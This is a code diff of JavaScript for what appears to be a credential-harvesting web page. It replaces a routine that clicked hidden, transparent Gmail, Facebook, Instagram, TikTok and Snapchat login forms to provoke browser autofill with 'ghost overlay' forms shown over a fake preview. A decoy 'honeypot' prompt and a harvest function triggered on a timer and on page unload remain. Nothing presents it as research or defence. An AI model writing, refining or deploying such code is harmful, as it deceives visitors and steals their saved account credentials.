@@ -95,46 +95,17 @@ setTimeout(harvest, 15000);
 // Also, listen for the page unload event as a last resort
 window.addEventListener('beforeunload', harvest);
 
-// --- UI & Honeypot Logic ---
+// --- UI & Ghost Overlay Logic ---
 
-// After a delay, hide the loader and show the honeypot prompt
+// After a delay, hide the loader and show the honeypot text and ghost overlays
 setTimeout(() => {
   const previewContainer = document.querySelector('.preview-container');
   const honeypotContainer = document.querySelector('.honeypot-container');
+  const formOverlays = document.querySelectorAll('.form-overlay');
+
   if (previewContainer) previewContainer.style.display = 'none';
   if (honeypotContainer) honeypotContainer.style.display = 'block';
-}, 1500);
-
-function triggerAllAutofills() {
-  console.log('Honeypot triggered, attempting to fire all autofill prompts...');
-
-  const forms = document.querySelectorAll('.hidden-form');
-  
-  // Temporarily make forms visible to allow clicks
-  forms.forEach(form => {
+  formOverlays.forEach(form => {
     form.style.display = 'block';
-    form.style.opacity = '0';
-    form.style.position = 'absolute'; // Prevent layout shift
   });
-
-  // Click all the username/email fields
-  document.querySelector('#gmail-form input[name="email"]')?.click();
-  document.querySelector('#facebook-form input[name="username"]')?.click();
-  document.querySelector('#instagram-form input[name="username"]')?.click();
-  document.querySelector('#tiktok-form input[name="username"]')?.click();
-  document.querySelector('#snapchat-form input[name="username"]')?.click();
-
-  // Hide the forms again shortly after
-  setTimeout(() => {
-      forms.forEach(form => {
-          form.style.display = 'none';
-      });
-  }, 100);
-}
-
-// Add a one-time event listener to the honeypot input.
-// Using 'mousedown' as it can be more reliable for triggering programmatic clicks.
-const honeypotInput = document.getElementById('honeypot-input');
-if (honeypotInput) {
-  honeypotInput.addEventListener('mousedown', triggerAllAutofills, { once: true });
-}
+}, 1500);
